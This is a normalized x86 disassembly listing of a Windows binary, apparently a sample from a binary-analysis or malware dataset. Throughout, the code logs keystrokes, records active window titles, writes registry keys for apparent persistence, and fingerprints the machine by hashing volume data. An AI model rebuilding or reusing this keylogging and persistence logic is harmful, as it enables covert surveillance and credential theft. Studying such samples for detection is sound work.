cmp [ ebp - 0x28 ] eax
jge r-xdata
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push 0x8004
push [ ebp - 0xc ]
call [ CryptCreateHash@IAT ]
test eax eax
je r-xdata
mov ecx rw-data
call sub_401ca3
push [ ebp - 0x28 ]
mov ecx rw-data
call sub_401ccc
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
call sub_417232
jmp r-xdata
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x28 ] eax
push 0x0
push [ ebp - 0x40 ]
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
push eax
push [ ebp - 0x40 ]
push [ ebp - 0x8 ]
call [ CryptHashData@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x2c ] 0x14
push 0x0
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x2
push [ ebp - 0x8 ]
call [ CryptGetHashParam@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x8 ]
call [ CryptDestroyHash@IAT ]
mov edx 0x84
mov ecx [ ebp + 0x8 ]
call sub_417318
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ eax + 0x80 ] ecx
mov eax [ ebp - 0x4 ]
and [ eax ] 0x0
mov [ ebp - 0x21 ] 0x0
and [ ebp - 0x44 ] 0x0
jmp r-xdata
cmp [ ebp - 0x44 ] 0x14
jge r-xdata
movzx eax [ ebp - 0x21 ]
push eax
push r--data
lea eax [ ebp - 0x3c ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4 ]
call [ lstrcatW@IAT ]
mov edx [ ebp - 0x4 ]
mov ecx rw-data
call sub_401cb4
mov eax [ ebp - 0x44 ]
mov al [ ebp + eax - 0x20 ]
mov [ ebp - 0x45 ] al
movzx eax [ ebp - 0x45 ]
movzx ecx [ ebp - 0x21 ]
add ecx eax
mov [ ebp - 0x21 ] cl
movzx eax [ ebp - 0x45 ]
push eax
push r--data
lea eax [ ebp - 0x3c ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4 ]
call [ lstrcatW@IAT ]
jmp r-xdata
mov eax [ ebp - 0x44 ]
inc eax
mov [ ebp - 0x44 ] eax
sub_41a03a
push ebp
mov ebp esp
push 0xffffffff
push sub_423d17
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
lea ecx [ ebp - 0x3c ]
call sub_401068
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_401068
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x1c ]
call sub_401068
mov [ ebp - 0x4 ] 0x2
push 0x0
call [ CoInitialize@IAT ]
push [ ebp + 0x8 ]
call sub_418bce
pop ecx
push [ ebp + 0x8 ]
call sub_419039
pop ecx
movzx eax al
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_4199e9
pop ecx
push [ ebp + 0x8 ]
call sub_418f19
pop ecx
push [ ebp + 0x8 ]
call sub_4199e9
pop ecx
push [ ebp + 0x8 ]
call sub_419e3e
pop ecx
push [ ebp + 0x8 ]
call sub_418396
pop ecx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_418ab1
pop ecx
call [ CoUninitialize@IAT ]
mov [ ebp - 0x3d ] 0x1
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x1c ]
call sub_4010a3
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x3c ]
call sub_4010a3
mov al [ ebp - 0x3d ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_41a10f
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push r--data
mov edx [ ebp + 0x8 ]
add edx 0x24
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call sub_4134ac
movzx eax al
test eax eax
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] 0x1
mov al 0x1
jmp r-xdata
leave
retn
sub_41a144
push ebp
mov ebp esp
sub esp 0x360
mov [ ebp - 0x35c ] ecx
mov eax [ ebp - 0x35c ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x35c ]
cmp [ eax + 0x58b8 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x35c ]
mov eax [ eax + 0x58b8 ]
mov eax [ ebp - 0x35c ]
and [ eax + 0x58b8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
mov edx sub_41a10f
mov ecx [ ebp - 0x35c ]
call sub_412a07
mov [ ebp - 0x331 ] 0x0
push 0x104
lea eax [ ebp - 0x210 ]
push eax
call [ FindFirstVolumeW@IAT ]
mov [ ebp - 0x34c ] eax
and [ ebp - 0x340 ] 0x0
and [ ebp - 0x33c ] 0x0
cmp [ ebp - 0x34c ] 0xffffffff
je r-xdata
push 0x0
push 0x100000
push [ ebp - 0x33c ]
push [ ebp - 0x340 ]
call sub_41f670
mov [ ebp - 0x340 ] eax
mov [ ebp - 0x33c ] edx
cmp [ ebp - 0x33c ] 0x0
ja r-xdata
and [ ebp - 0x358 ] 0x0
and [ ebp - 0x354 ] 0x0
and [ ebp - 0x348 ] 0x0
and [ ebp - 0x344 ] 0x0
push 0x0
lea eax [ ebp - 0x358 ]
push eax
lea eax [ ebp - 0x348 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ GetDiskFreeSpaceExW@IAT ]
test eax eax
je r-xdata
movzx eax [ ebp - 0x4 ]
test eax eax
jne r-xdata
jb r-xdata
push 0x104
lea eax [ ebp - 0x210 ]
push eax
push [ ebp - 0x34c ]
call [ FindNextVolumeW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x340 ]
add eax [ ebp - 0x358 ]
mov ecx [ ebp - 0x33c ]
adc ecx [ ebp - 0x354 ]
mov [ ebp - 0x340 ] eax
mov [ ebp - 0x33c ] ecx
push r--data
mov ecx [ ebp - 0x35c ]
call sub_415c87
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
movzx eax [ ebp - 0x331 ]
test eax eax
je r-xdata
mov [ ebp - 0x331 ] 0x1
cmp [ ebp - 0x340 ] 0x4000
jae r-xdata
push [ ebp - 0x34c ]
call [ FindVolumeClose@IAT ]
mov eax [ ebp - 0x35c ]
mov eax [ eax + 0x58b8 ]
jmp r-xdata
mov eax [ ebp - 0x35c ]
mov [ eax + 0x58b8 ] 0x309
push 0x11c
lea eax [ ebp - 0x330 ]
push eax
call sub_40103d
pop ecx
pop ecx
mov [ ebp - 0x330 ] 0x11c
lea eax [ ebp - 0x330 ]
push eax
call [ GetVersionExW@IAT ]
test eax eax
jne r-xdata
leave
retn
mov eax [ ebp - 0x320 ]
mov [ ebp - 0x360 ] eax
cmp [ ebp - 0x360 ] 0x0
jb r-xdata
mov [ ebp - 0x330 ] 0x114
lea eax [ ebp - 0x330 ]
push eax
call [ GetVersionExW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x360 ] 0x1
jbe r-xdata
mov eax [ ebp - 0x35c ]
and [ eax + 0x58b8 ] 0x0
mov eax [ ebp - 0x35c ]
mov eax [ eax + 0x58b8 ]
jmp r-xdata
mov eax [ ebp - 0x35c ]
and [ eax + 0x58b8 ] 0x0
cmp [ ebp - 0x360 ] 0x2
je r-xdata
cmp [ ebp - 0x32c ] 0x6
jbe r-xdata
jmp r-xdata
cmp [ ebp - 0x32c ] 0x6
jne r-xdata
mov eax [ ebp - 0x35c ]
mov [ eax + 0x58b8 ] 0x5
jmp r-xdata
cmp [ ebp - 0x32c ] 0x6
jne r-xdata
cmp [ ebp - 0x328 ] 0x1
jb r-xdata
cmp [ ebp - 0x32c ] 0x5
jne r-xdata
cmp [ ebp - 0x328 ] 0x0
jne r-xdata
mov eax [ ebp - 0x35c ]
mov [ eax + 0x58b8 ] 0x5
jmp r-xdata
cmp [ ebp - 0x32c ] 0x5
jne r-xdata
cmp [ ebp - 0x328 ] 0x2
jne r-xdata
mov eax [ ebp - 0x35c ]
mov [ eax + 0x58b8 ] 0x3
jmp r-xdata
cmp [ ebp - 0x32c ] 0x5
jne r-xdata
cmp [ ebp - 0x328 ] 0x1
jne r-xdata
mov eax [ ebp - 0x35c ]
mov [ eax + 0x58b8 ] 0x2
jmp r-xdata
cmp [ ebp - 0x328 ] 0x0
jne r-xdata
mov eax [ ebp - 0x35c ]
mov [ eax + 0x58b8 ] 0x2
jmp r-xdata
mov eax [ ebp - 0x35c ]
mov [ eax + 0x58b8 ] 0x1
jmp r-xdata
sub_41a473
push ebp
mov ebp esp
sub esp 0x230
and [ ebp - 0x4 ] 0x0
and [ ebp - 0xc ] 0x0
mov ecx [ ebp + 0x8 ]
call sub_41121b
cmp eax 0x28
jl r-xdata
xor al al
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push r--data
push 0x0
push 0x0
call [ rw-data ]
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_411ef6
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_411e2c
mov [ ebp - 0x4 ] eax
push 0x1
push 0x695
push rw-data
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_412449
movzx eax al
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
mov edx [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_417232
mov al 0x1
jmp r-xdata
push 0x1
push r--data
mov ecx [ ebp + 0x8 ]
call sub_415c32
push eax
xor edx edx
mov ecx [ ebp + 0x8 ]
call sub_4120dc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
leave
retn
push r--data
lea eax [ ebp - 0x230 ]
push eax
call [ lstrcpyW@IAT ]
push [ ebp - 0xc ]
lea eax [ ebp - 0x230 ]
push eax
call [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x230 ]
push eax
call [ lstrcatW@IAT ]
push 0x4
lea edx [ ebp - 0x24 ]
mov ecx [ ebp + 0x8 ]
call sub_413c8f
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x230 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x230 ]
push eax
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
mov [ ebp - 0x8 ] eax
push [ ebp - 0x8 ]
lea eax [ ebp - 0x230 ]
push eax
push 0x3
push r--data
push r--data
mov edx 0x80000002
mov ecx [ ebp + 0x8 ]
call sub_4100e9
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413247
movzx eax al
test eax eax
je r-xdata
push 0x0
mov ecx [ ebp + 0x8 ]
call sub_415c32
mov edx eax
mov ecx [ ebp + 0x8 ]
call sub_413434
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] r--data
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push 0x0
call [ rw-data ]
mov [ ebp - 0x1c ] eax
sub_41a655
push ebp
mov ebp esp
sub esp 0x638
and [ ebp - 0x218 ] 0x0
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x8 ] 0x0
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_411c67
mov [ ebp - 0x218 ] eax
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
cmp [ ebp - 0x218 ] 0x0
je r-xdata
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_411d45
mov [ ebp - 0x218 ] eax
mov edx [ ebp - 0x218 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
xor al al
push 0x1
push 0x55a
push rw-data
mov edx [ ebp - 0x218 ]
mov ecx [ ebp + 0x8 ]
call sub_412449
movzx eax al
test eax eax
je r-xdata
mov edx [ ebp - 0x218 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
mov al 0x1
jmp r-xdata
push 0x0
push r--data
push [ ebp - 0x218 ]
xor edx edx
mov ecx [ ebp + 0x8 ]
call sub_4120dc
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
push 0x1
push r--data
mov ecx [ ebp + 0x8 ]
call sub_415c32
push eax
xor edx edx
mov ecx [ ebp + 0x8 ]
call sub_4120dc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push r--data
lea eax [ ebp - 0x638 ]
push eax
call [ lstrcpyW@IAT ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0x638 ]
push eax
call [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x638 ]
push eax
call [ lstrcatW@IAT ]
push 0x4
lea edx [ ebp - 0x430 ]
mov ecx [ ebp + 0x8 ]
call sub_413c8f
lea eax [ ebp - 0x430 ]
push eax
lea eax [ ebp - 0x638 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x638 ]
push eax
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
mov [ ebp - 0x214 ] eax
push [ ebp - 0x214 ]
lea eax [ ebp - 0x638 ]
push eax
push 0x3
push r--data
push r--data
mov edx 0x80000002
mov ecx [ ebp + 0x8 ]
call sub_4100e9
push r--data
lea eax [ ebp - 0x428 ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x428 ]
push eax
call [ lstrcatW@IAT ]
push r--data
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
mov [ ebp - 0x214 ] eax
push [ ebp - 0x214 ]
push r--data
push 0x1
push 0x0
lea eax [ ebp - 0x428 ]
push eax
mov edx 0x80000000
mov ecx [ ebp + 0x8 ]
call sub_4100e9
lea eax [ ebp - 0x428 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcatW@IAT ]
push [ ebp - 0x4 ]
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
mov [ ebp - 0x214 ] eax
push [ ebp - 0x214 ]
push [ ebp - 0x4 ]
push 0x1
push 0x0
lea eax [ ebp - 0x210 ]
push eax
mov edx 0x80000000
mov ecx [ ebp + 0x8 ]
call sub_4100e9
push r--data
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
mov [ ebp - 0x214 ] eax
push [ ebp - 0x214 ]
push r--data
push 0x1
push r--data
lea eax [ ebp - 0x210 ]
push eax
mov edx 0x80000000
mov ecx [ ebp + 0x8 ]
call sub_4100e9
lea eax [ ebp - 0x428 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcatW@IAT ]
push r--data
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
mov [ ebp - 0x214 ] eax
push [ ebp - 0x214 ]
push r--data
push 0x1
push 0x0
lea eax [ ebp - 0x210 ]
push eax
mov edx 0x80000000
mov ecx [ ebp + 0x8 ]
call sub_4100e9
lea eax [ ebp - 0x428 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcatW@IAT ]
push r--data
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
mov [ ebp - 0x214 ] eax
push [ ebp - 0x214 ]
push r--data
push 0x1
push 0x0
lea eax [ ebp - 0x210 ]
push eax
mov edx 0x80000000
mov ecx [ ebp + 0x8 ]
call sub_4100e9
push r--data
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcatW@IAT ]
push r--data
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
mov [ ebp - 0x214 ] eax
push [ ebp - 0x214 ]
push r--data
push 0x1
push 0x0
lea eax [ ebp - 0x210 ]
push eax
mov edx 0x80000002
mov ecx [ ebp + 0x8 ]
call sub_4100e9
mov [ ebp - 0x21c ] 0x1
push 0x4
lea eax [ ebp - 0x21c ]
push eax
push 0x4
push r--data
lea eax [ ebp - 0x210 ]
push eax
mov edx 0x80000002
mov ecx [ ebp + 0x8 ]
call sub_4100e9
push 0x0
mov ecx [ ebp + 0x8 ]
call sub_415c32
mov edx eax
mov ecx [ ebp + 0x8 ]
call sub_413434
mov [ ebp - 0x8 ] eax
sub_41aa48
push ebp
mov ebp esp
sub esp 0x224
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
call sub_41121b
cmp eax 0x28
jl r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_41a144
cmp eax 0x1
jl r-xdata
leave
retn
mov ecx [ ebp + 0x8 ]
call sub_41a144
cmp eax 0x3
jge r-xdata
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_411ef6
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_411e2c
mov [ ebp - 0x4 ] eax
jmp r-xdata
push 0x1
push 0x66b
push rw-data
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_412449
movzx eax al
test eax eax
je r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
push 0x1
push r--data
mov ecx [ ebp + 0x8 ]
call sub_415c32
push eax
xor edx edx
mov ecx [ ebp + 0x8 ]
call sub_4120dc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push r--data
lea eax [ ebp - 0x220 ]
push eax
call [ lstrcpyW@IAT ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0x220 ]
push eax
call [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x220 ]
push eax
call [ lstrcatW@IAT ]
push 0x4
lea edx [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
call sub_413c8f
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x220 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x220 ]
push eax
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
mov [ ebp - 0x10 ] eax
push [ ebp - 0x10 ]
lea eax [ ebp - 0x220 ]
push eax
push 0x1
push r--data
push r--data
mov edx 0x80000002
mov ecx [ ebp + 0x8 ]
call sub_4100e9
mov [ ebp - 0xc ] 0x1
push 0x4
lea eax [ ebp - 0xc ]
push eax
push 0x4
push r--data
push r--data
mov edx 0x80000002
mov ecx [ ebp + 0x8 ]
call sub_4100e9
and [ ebp - 0xc ] 0x0
push 0x4
lea eax [ ebp - 0xc ]
push eax
push 0x4
push r--data
push r--data
mov edx 0x80000002
mov ecx [ ebp + 0x8 ]
call sub_4100e9
push r--data
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
push eax
push r--data
push 0x1
push r--data
push r--data
mov edx 0x80000002
mov ecx [ ebp + 0x8 ]
call sub_4100e9
and [ ebp - 0x224 ] 0x0
jmp r-xdata
push 0x0
mov ecx [ ebp + 0x8 ]
call sub_415c32
mov edx eax
mov ecx [ ebp + 0x8 ]
call sub_413434
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x224 ] 0x9
jge r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
mov eax [ ebp - 0x224 ]
push [ eax * 8 + rw-data ]
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
push eax
mov eax [ ebp - 0x224 ]
push [ eax * 8 + rw-data ]
push 0x1
mov eax [ ebp - 0x224 ]
push [ eax * 8 + rw-data ]
push r--data
mov edx 0x80000002
mov ecx [ ebp + 0x8 ]
call sub_4100e9
jmp r-xdata
mov eax [ ebp - 0x224 ]
inc eax
mov [ ebp - 0x224 ] eax
sub_41acaa
push ebp
mov ebp esp
sub esp 0x2a0
and [ ebp - 0x88 ] 0x0
and [ ebp - 0x8c ] 0x0
and [ ebp - 0x90 ] 0x0
mov ecx [ ebp + 0x8 ]
call sub_41121b
cmp eax 0x28
jl r-xdata
xor al al
jmp r-xdata
push 0x1
push r--data
mov ecx [ ebp + 0x8 ]
call sub_415c32
push eax
xor edx edx
mov ecx [ ebp + 0x8 ]
call sub_4120dc
mov [ ebp - 0x88 ] eax
cmp [ ebp - 0x88 ] 0x0
jne r-xdata
leave
retn
push r--data
lea eax [ ebp - 0x2a0 ]
push eax
call [ lstrcpyW@IAT ]
push [ ebp - 0x88 ]
lea eax [ ebp - 0x2a0 ]
push eax
call [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x2a0 ]
push eax
call [ lstrcatW@IAT ]
push 0x4
lea edx [ ebp - 0x98 ]
mov ecx [ ebp + 0x8 ]
call sub_413c8f
lea eax [ ebp - 0x98 ]
push eax
lea eax [ ebp - 0x2a0 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x2a0 ]
push eax
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
mov [ ebp - 0x84 ] eax
push [ ebp - 0x84 ]
lea eax [ ebp - 0x2a0 ]
push eax
push 0x3
push r--data
push r--data
mov edx 0x80000002
mov ecx [ ebp + 0x8 ]
call sub_4100e9
push 0x2
lea edx [ ebp - 0x80 ]
mov ecx [ ebp + 0x8 ]
call sub_413bfd
push r--data
lea eax [ ebp - 0x80 ]
push eax
call [ lstrcatW@IAT ]
lea edx [ ebp - 0x80 ]
mov ecx [ ebp + 0x8 ]
call sub_411c67
mov [ ebp - 0x8c ] eax
cmp [ ebp - 0x8c ] 0x0
je r-xdata
push 0x0
mov ecx [ ebp + 0x8 ]
call sub_415c32
mov edx eax
mov ecx [ ebp + 0x8 ]
call sub_413434
mov [ ebp - 0x88 ] eax
cmp [ ebp - 0x88 ] 0x0
jne r-xdata
jmp r-xdata
push 0x1
push 0xb25
push rw-data
mov edx [ ebp - 0x8c ]
mov ecx [ ebp + 0x8 ]
call sub_412449
movzx eax al
test eax eax
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
mov edx [ ebp - 0x8c ]
mov ecx [ ebp + 0x8 ]
call sub_417232
mov edx [ ebp - 0x88 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
push 0x1
push r--data
push [ ebp - 0x8c ]
xor edx edx
mov ecx [ ebp + 0x8 ]
call sub_4120dc
mov [ ebp - 0x90 ] eax
cmp [ ebp - 0x90 ] 0x0
je r-xdata
push 0x0
push r--data
mov edx [ ebp - 0x90 ]
mov ecx [ ebp + 0x8 ]
call sub_4137e7
mov edx [ ebp - 0x90 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
sub_41ae8e
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
call sub_4106f0
mov ecx rw-data
call sub_40fc37
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xffffffff
je r-xdata
xor al al
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_40fca2
mov al 0x1
jmp r-xdata
leave
retn
sub_41aec6
push ebp
mov ebp esp
sub esp 0x1e0
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1dc ] eax
cmp [ ebp - 0x1dc ] 0x12
je r-xdata
push 0x0
call [ PostQuitMessage@IAT ]
jmp r-xdata
cmp [ ebp - 0x1dc ] 0x4f
jbe r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ DefWindowProcW@IAT ]
leave
retn 0x10
cmp [ ebp - 0x1dc ] 0x51
jbe r-xdata
mov eax [ ebp + 0x14 ]
mov [ rw-data ] eax
jmp r-xdata
cmp [ ebp - 0x1dc ] 0xff
je r-xdata
and [ ebp - 0x1d4 ] 0x0
push 0x10
lea eax [ ebp - 0x1d4 ]
push eax
push 0x0
push 0x10000003
push [ ebp + 0x14 ]
call [ GetRawInputData@IAT ]
mov [ ebp - 0x1b8 ] eax
cmp [ ebp - 0x1b8 ] 0x0
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x1d4 ] 0x0
jbe r-xdata
call sub_414299
mov edx rw-data
mov ecx eax
call sub_410cc8
mov ecx rw-data
call sub_401000
cmp eax [ ebp - 0x1d4 ]
jae r-xdata
call [ GetForegroundWindow@IAT ]
mov [ ebp - 0x1b0 ] eax
mov eax [ ebp - 0x1b0 ]
cmp eax [ rw-data ]
je r-xdata
push 0x1
push [ ebp - 0x1d4 ]
mov ecx rw-data
call sub_4105e1
push 0x10
lea eax [ ebp - 0x1d4 ]
push eax
mov ecx rw-data
call sub_40100f
push eax
push 0x10000003
push [ ebp + 0x14 ]
call [ GetRawInputData@IAT ]
mov [ ebp - 0x1b8 ] eax
mov eax [ ebp - 0x1b8 ]
cmp eax [ ebp - 0x1d4 ]
jne r-xdata
push 0x190
lea eax [ ebp - 0x198 ]
push eax
call sub_40103d
pop ecx
pop ecx
push r--data
lea eax [ ebp - 0x198 ]
push eax
call [ lstrcpyW@IAT ]
push 0xc7
lea eax [ ebp - 0x198 ]
push eax
push [ ebp - 0x1b0 ]
call [ GetWindowTextW@IAT ]
mov [ ebp - 0x1a8 ] 0x11
mov eax [ ebp - 0x1b0 ]
mov [ ebp - 0x1a7 ] eax
call sub_414299
call sub_4137bf
mov [ ebp - 0x1a3 ] eax
push 0x0
push 0x9
lea eax [ ebp - 0x1a8 ]
push eax
mov ecx rw-data
call sub_410811
lea eax [ ebp - 0x198 ]
push eax
mov ecx rw-data
call sub_401345
mov eax [ ebp - 0x1b0 ]
mov [ rw-data ] eax
call sub_414299
mov edx rw-data
mov ecx eax
call sub_410c93
mov ecx rw-data
call sub_40100f
mov [ ebp - 0x1d8 ] eax
mov eax [ ebp - 0x1d8 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp - 0x1d8 ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebp - 0x1d8 ]
mov ax [ eax + 0x14 ]
mov [ ebp - 0x1cd ] ax
movzx eax [ ebp - 0x1cd ]
and eax 0x2
jne r-xdata
mov eax [ ebp - 0x1d8 ]
cmp [ eax + 0x18 ] 0x100
jne r-xdata
mov [ ebp - 0x1d0 ] 0x36
mov eax [ ebp - 0x1d8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x1c9 ] eax
mov eax [ ebp - 0x1d8 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x1c5 ] eax
push 0x0
push 0x13
lea eax [ ebp - 0x1d0 ]
push eax
mov ecx rw-data
call sub_410811
movzx eax [ ebp - 0x1cd ]
and eax 0x8
jne r-xdata
mov [ ebp - 0x1d0 ] 0x24
and [ ebp - 0x1cd ] 0x0
push 0x10
call [ GetAsyncKeyState@IAT ]
movsx eax ax
and eax 0x80000000
neg eax
sbb eax eax
neg eax
mov [ ebp - 0x1 ] al
push 0x12
call [ GetAsyncKeyState@IAT ]
movsx eax ax
and eax 0x80000000
neg eax
sbb eax eax
neg eax
mov [ ebp - 0x1b2 ] al
push 0x11
call [ GetAsyncKeyState@IAT ]
movsx eax ax
and eax 0x80000000
neg eax
sbb eax eax
neg eax
mov [ ebp - 0x1b1 ] al
push 0x14
call [ GetAsyncKeyState@IAT ]
movsx eax ax
and eax 0x80000000
neg eax
sbb eax eax
neg eax
mov [ ebp - 0x199 ] al
push 0x91
call [ GetAsyncKeyState@IAT ]
movsx eax ax
and eax 0x80000000
neg eax
sbb eax eax
neg eax
mov [ ebp - 0x1b9 ] al
push 0x90
call [ GetAsyncKeyState@IAT ]
movsx eax ax
and eax 0x80000000
neg eax
sbb eax eax
neg eax
mov [ ebp - 0x1a9 ] al
movzx eax [ ebp - 0x1b2 ]
test eax eax
je r-xdata
movzx eax [ ebp - 0x1cd ]
and eax 0x20
jne r-xdata
movzx eax [ ebp - 0x1b1 ]
test eax eax
je r-xdata
movzx eax [ ebp - 0x1cd ]
or eax 0x1
mov [ ebp - 0x1cd ] ax
movzx eax [ ebp - 0x1cd ]
and eax 0x80
jne r-xdata
movzx eax [ ebp - 0x1 ]
test eax eax
je r-xdata
movzx eax [ ebp - 0x1cd ]
or eax 0x2
mov [ ebp - 0x1cd ] ax
movzx eax [ ebp - 0x1cd ]
and eax 0x200
je r-xdata
